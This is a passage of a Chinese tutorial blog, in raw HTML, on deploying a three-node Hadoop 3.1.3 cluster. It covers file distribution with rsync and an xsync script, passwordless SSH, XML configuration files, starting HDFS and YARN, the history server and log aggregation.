前提：在hadoop102、hadoop103、hadoop104都已经创建好的/opt/module、/opt/software两个目录，并且已经把这两个目录修改为atguigu:atguigu</span></span><br><span class="line"><span class="comment"># scp -r /opt/module/jdk1.8.0_121  atguigu@hadoop103:/opt/module</span></span><br><span class="line">scp -r atguigu@hadoop102:/opt/module/* atguigu@hadoop103:/opt/module</span><br><span class="line">scp -r atguigu@hadoop102:/opt/module/* atguigu@hadoop104:/opt/module</span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================rsync远程同步工具=======================</span></span><br><span class="line"><span class="comment"># rsync主要用于备份和镜像。具有速度快、避免复制相同内容和支持符号链接的优点</span></span><br><span class="line"><span class="comment"># rsync和scp区别：用rsync做文件的复制要比scp的速度快，rsync只对差异文件做更新。scp是把所有文件都复制过去</span></span><br><span class="line"><span class="comment"># 基本命令：rsync -av $pdir/$fname $user@$host:$pdir/$fname</span></span><br><span class="line"><span class="comment"># -a 归档拷贝;-v 显示复制过程</span></span><br><span class="line">rm -rf wcinput/</span><br><span class="line">rsync -av hadoop-3.1.3/ atguigu@hadoop103:/opt/module/hadoop-3.1.3/</span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================xsync集群分发脚本=========================</span></span><br><span class="line"><span class="comment"># 需求：循环复制文件到所有节点的相同目录下</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在/home/atguigu/bin目录下创建xsync文件</span></span><br><span class="line"><span class="built_in">cd</span> /home/atguigu</span><br><span class="line">mkdir bin</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line">vim xsync</span><br><span class="line"><span class="comment"># 写入一下脚本</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#1. 判断参数个数</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -lt 1 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> Not Enough Arguement!</span><br><span class="line">    <span class="built_in">exit</span>;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#2. 遍历集群所有机器</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> ====================  <span class="variable">$host</span>  ====================</span><br><span class="line">    <span class="comment">#3. 遍历所有目录，挨个发送</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$@</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="comment">#4. 判断文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> [ -e <span class="variable">$file</span> ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                <span class="comment">#5. 获取父目录</span></span><br><span class="line">                pdir=$(<span class="built_in">cd</span> -P $(dirname <span class="variable">$file</span>); <span class="built_in">pwd</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">#6. 获取当前文件的名称</span></span><br><span class="line">                fname=$(basename <span class="variable">$file</span>)</span><br><span class="line">                ssh <span class="variable">$host</span> <span class="string">"mkdir -p <span class="variable">$pdir</span>"</span></span><br><span class="line">                rsync -av <span class="variable">$pdir</span>/<span class="variable">$fname</span> <span class="variable">$host</span>:<span class="variable">$pdir</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$file</span> does not exists!</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改脚本 xsync 具有执行权限</span></span><br><span class="line">chmod +x xsync</span><br><span class="line"><span class="comment"># 测试脚本</span></span><br><span class="line">xsync /home/atguigu/bin</span><br><span class="line"><span class="comment"># 将脚本复制到/bin中，以便全局调用</span></span><br><span class="line">sudo cp xsync /bin/</span><br><span class="line"><span class="comment"># 同步环境变量配置（root所有者）</span></span><br><span class="line">sudo ./bin/xsync /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 每台机器都刷一下</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="4-2-SSH免密配置">4.2 SSH免密配置</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330901.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">ls -la</span><br><span class="line"><span class="comment"># 如果没有就创建</span></span><br><span class="line"><span class="comment"># mkdir -p .ssh</span></span><br><span class="line"><span class="built_in">cd</span> .ssh/</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="comment"># 将公钥拷贝到要免密登录的目标机器上</span></span><br><span class="line">ssh-copy-id hadoop102</span><br><span class="line">ssh-copy-id hadoop103</span><br><span class="line">ssh-copy-id hadoop104</span><br><span class="line"><span class="comment"># 注意103，104机器还需要进行相同的配置操作，使其互相免密登陆</span></span><br><span class="line"><span class="comment"># 还需要在 hadoop102 上采用 root 账号，配置一下无密登录到 hadoop102、hadoop103、hadoop104；</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># .ssh 文件夹下（~/.ssh）的文件功能解释</span></span><br><span class="line"><span class="comment"># known_hosts，记录 ssh 访问过计算机的公钥（public key）</span></span><br><span class="line"><span class="comment"># id_rsa，生成的私钥</span></span><br><span class="line"><span class="comment"># id_rsa.pub，生成的公钥</span></span><br><span class="line"><span class="comment"># authorized_keys，存放授权过的无密登录服务器公钥</span></span><br></pre></td></tr></table></figure><h3 id="4-3-集群配置">4.3 集群配置</h3><p><strong>1)集群部署规划</strong></p><ul><li>NameNode和SecondaryNameNode不要安装在同一台服务器</li><li>ResourceManager也很消耗内存，不要和NameNode、SecondaryNameNode配置在同一台机器上。</li></ul><table><thead><tr><th></th><th>hadoop102</th><th>hadoop103</th><th>hadoop104</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNodeDataNode</td><td>DataNode</td><td>SecondaryNameNodeDataNode</td></tr><tr><td>YARN</td><td>NodeManager</td><td>ResourceManagerNodeManager</td><td>NodeManager</td></tr></tbody></table><p><strong>2)配置文件说明</strong></p><p>Hadoop配置文件分两类：默认配置文件和自定义配置文件，只有用户想修改某一默认配置值时，才需要修改自定义配置文件，更改相应属性值</p><ul><li>默认配置文件</li></ul><table><thead><tr><th>要获取的默认文件</th><th>文件存放在Hadoop的jar包中的位置</th></tr></thead><tbody><tr><td>[core-default.xml]</td><td>hadoop-common-3.1.3.jar/core-default.xml</td></tr><tr><td>[hdfs-default.xml]</td><td>hadoop-hdfs-3.1.3.jar/hdfs-default.xml</td></tr><tr><td>[yarn-default.xml]</td><td>hadoop-yarn-common-3.1.3.jar/yarn-default.xml</td></tr><tr><td>[mapred-default.xml]</td><td>hadoop-mapreduce-client-core-3.1.3.jar/mapred-default.xml</td></tr></tbody></table><ul><li>自定义配置文件</li></ul><p><strong>core-site.xml</strong>、<strong>hdfs-site.xml</strong>、<strong>yarn-site.xml</strong>、<strong>mapred-site.xml</strong>四个配置文件存放在<code>$HADOOP_HOME/etc/hadoop</code>这个路径上，用户可以根据项目需求重新进行修改配置</p><p><strong>3)配置集群</strong></p><p>核心配置文件，配置<code>core-site.xml</code>，<code>cd $HADOOP_HOME/etc/hadoop</code>，<code>vim core-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定NameNode的地址 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop102:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定hadoop数据的存储目录 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/module/hadoop-3.1.3/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置HDFS网页登录使用的静态用户为atguigu --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.http.staticuser.user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>atguigu<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HDFS配置文件，配置hdfs-site.xml，<code>vim hdfs-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- nn web端访问地址--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 2nn web端访问地址--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.secondary.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:9868<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>YARN配置文件，配置yarn-site.xml，<code>vim yarn-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定MR走shuffle --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 指定ResourceManager的地址--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 环境变量的继承 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.env-whitelist<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAPRED_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>MapReduce配置文件，配置mapred-site.xml，<code>vim mapred-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 指定MapReduce程序运行在Yarn上 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>4)在集群上分发配置好的Hadoop配置文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xsync /opt/module/hadoop-3.1.3/etc/hadoop/</span><br><span class="line"><span class="comment"># 去其他节点查看</span></span><br><span class="line">cat /opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml</span><br></pre></td></tr></table></figure><h3 id="4-4-启动集群">4.4 启动集群</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先需要配置workers,其中每一行都代表着一个worker节点的主机名或IP地址，hadoop通过这个文件来确定集群中有哪些节点并且将任务分配到这些节点上</span></span><br><span class="line">vim /opt/module/hadoop-3.1.3/etc/hadoop/workers</span><br><span class="line"><span class="comment"># 该文件中添加的内容结尾不允许有空格，文件中不允许有空行</span></span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line"><span class="comment"># 分发</span></span><br><span class="line">xsync /opt/module/hadoop-3.1.3/etc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动集群</span></span><br><span class="line"><span class="comment"># 如果集群是第一次启动，需要在hadoop102节点格式化NameNode</span></span><br><span class="line"><span class="comment">#（注意：格式化NameNode，会产生新的集群id，导致NameNode和DataNode的集群id不一致，集群找不到已往数据。如果集群在运行过程中报错，需要重新格式化NameNode的话，一定要先停止namenode和datanode进程，并且要删除所有机器的data和logs目录，然后再进行格式化。）</span></span><br><span class="line"><span class="comment"># 注意以下操作要在atguigu账号下进行，不要在root下</span></span><br><span class="line">hdfs namenode -format</span><br><span class="line"><span class="comment"># 启动HDFS</span></span><br><span class="line">sbin/start-dfs.sh</span><br><span class="line"><span class="comment"># 在配置了ResourceManager的节点（hadoop103）启动YARN</span></span><br><span class="line">sbin/start-yarn.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以在每个节点jps查看启动的服务</span></span><br><span class="line"><span class="comment"># Web端查看HDFS的NameNode，浏览器中输入：http://hadoop102:9870</span></span><br><span class="line"><span class="comment"># Web端查看YARN的ResourceManager，浏览器中输入：http://hadoop103:8088</span></span><br></pre></td></tr></table></figure><p>然后进行集群基本测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">hadoop fs -mkdir /input</span><br><span class="line"><span class="comment"># 传小文件</span></span><br><span class="line">hadoop fs -put <span class="variable">$HADOOP_HOME</span>/wcinput/word.txt /input</span><br><span class="line">hadoop fs -put  /opt/software/jdk-8u121-linux-x64.tar.gz  /</span><br><span class="line"><span class="comment"># 注意预览和下载需要在电脑配置好ip和主机名映射</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传文件后查看文件存放在什么位置</span></span><br><span class="line"><span class="comment"># 查看HDFS文件存储路径</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/hadoop-3.1.3/data/dfs/data/current/BP-1436128598-192.168.10.102-1610603650062/current/finalized/subdir0/subdir0</span><br><span class="line">ll</span><br><span class="line"><span class="comment"># 可以发现是那个txt文件</span></span><br><span class="line">cat blk_1073741825</span><br><span class="line"><span class="comment"># 对于jdk也可以进行拼接</span></span><br><span class="line">cat blk_1073741836&gt;&gt;tmp.tar.gz</span><br><span class="line">cat blk_1073741837&gt;&gt;tmp.tar.gz</span><br><span class="line">tar -zxvf tmp.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># hadoop文件下载</span></span><br><span class="line">hadoop fs -get /jdk-8u121-linux-x64.tar.gz ./</span><br><span class="line"><span class="comment"># 执行wordcount程序</span></span><br><span class="line">hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动报错，误删数据等情况，导致集群崩溃</span></span><br><span class="line"><span class="comment"># Version是启动的版本号，集群根据这个来定位，如果不一样就崩溃</span></span><br><span class="line">cat data/dfs/name/current/VERSION</span><br><span class="line"><span class="comment"># 如果集群异常，正常的操作方法是sbin/xxx脚本停止进程，然后删除data/和logs/，重新格式化，最后启动</span></span><br></pre></td></tr></table></figure><p>这里访问SNN：<code>http://hadoop104:9868/status.html</code>，会发现界面有bug，需要进入hadoop104</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/module/hadoop-3.1.3/share/hadoop/hdfs/webapps/static</span><br><span class="line">vim dfs-dust.js</span><br><span class="line"><span class="comment"># 在61行将moment所在行注释掉，添加自己的,最后清除缓存即可</span></span><br><span class="line"><span class="built_in">return</span> Number(v).toLocaleString()</span><br></pre></td></tr></table></figure><h3 id="4-5-配置历史服务器">4.5 配置历史服务器</h3><p>为了查看程序的历史运行情况，需要配置一下历史服务器，需要配置mapred-site.xml，在该文件里面增加如下配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 历史服务器端地址，rpc端口 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:10020<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 历史服务器web端地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:19888<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后进行操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分发配置</span></span><br><span class="line">xsync <span class="variable">$HADOOP_HOME</span>/etc/hadoop/mapred-site.xml</span><br><span class="line"><span class="comment"># 在hadoop102启动历史服务器</span></span><br><span class="line">mapred --daemon start historyserver</span><br><span class="line"><span class="comment"># 查看历史服务器是否启动</span></span><br><span class="line">jps</span><br><span class="line"><span class="comment"># 查看JobHistory</span></span><br><span class="line">http://hadoop102:19888/jobhistory</span><br></pre></td></tr></table></figure><h3 id="4-6-配置日志的聚集">4.6 配置日志的聚集</h3><blockquote><p>日志聚集概念：应用运行完成以后，将程序运行日志信息上传到HDFS系统上</p></blockquote><p>日志聚集功能好处：可以方便的查看到程序运行详情，方便开发调试。<strong>注意：开启日志聚集功能，需要重新启动 NodeManager 、ResourceManager 和HistoryServer</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202401251330902.png" alt></p><p>需要配置 yarn-site.xml，在该文件里面增加如下配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 开启日志聚集功能 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation-enable<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置日志聚集服务器地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log.server.url<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>http://hadoop102:19888/jobhistory/logs<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置日志保留时间为7天 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation.retain-seconds<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>604800<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>启动执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分发配置</span></span><br><span class="line">xsync <span class="variable">$HADOOP_HOME</span>/etc/hadoop/yarn-site.xml</span><br><span class="line"><span class="comment"># 关闭NodeManager 、ResourceManager和HistoryServer</span></span><br><span class="line"><span class="comment"># yarn在hadoop103操作</span></span><br><span class="line">sbin/stop-yarn.sh</span><br><span class="line">mapred --daemon stop historyserver</span><br><span class="line"><span class="comment"># 启动NodeManager 、ResourceManage和HistoryServer</span></span><br><span class="line">start-yarn.sh</span><br><span class="line">mapred --daemon start historyserver</span><br><span class="line"><span class="comment"># 删除HDFS上已经存在的输出文件</span></span><br><span class="line">hadoop fs -rm -r /output</span><br><span class="line"><span class="comment"># 执行WordCount程序</span></span><br><span class="line">hadoop jar <span class="variable">$HADOOP_HOME</span>/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br><span class="line"><span class="comment"># 查看日志</span></span><br><span class="line">http://hadoop102:19888/jobhistory</span><br></pre></td></tr></table></figure><h3 id="4-7-集群启动-停止方式总结">4.7 集群启动/停止方式总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 各个模块分开启动/停止（配置ssh是前提）常用</span></span><br><span class="line"><span class="comment"># 整体启动/停止HDFS</span></span><br><span class="line">start-dfs.sh/stop-dfs.sh</span><br><span class="line"><span class="comment"># 整体启动/停止YARN</span></span><br><span 